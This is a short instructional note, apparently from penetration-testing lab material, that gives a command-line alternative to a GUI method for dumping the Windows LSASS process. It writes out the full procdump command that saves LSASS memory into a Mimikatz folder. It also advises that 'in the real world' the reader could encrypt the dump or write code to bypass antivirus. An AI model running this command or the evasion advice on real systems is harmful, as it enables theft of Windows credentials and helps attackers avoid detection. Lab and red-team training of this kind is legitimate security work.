This is an alternative way to do it to the GUI that we did inside of 
GUI.txt

Here is how we do it:

(make sure you have it, then navigate to it.)

cd c:\Tools\SysinternalsSuite

c:\Tools\SysinternalsSuite\procdump.exe -accepteula -ma lsass.exe c:\Tools\Mimikatz\lsass_dump

Note that the dump process is writing to disk. Dumping the LSASS process is a known technique used by adversaries. Thus, AV products may flag it as malicious. In the real world, you may be more creative and write code to encrypt or implement a method to bypass AV products.
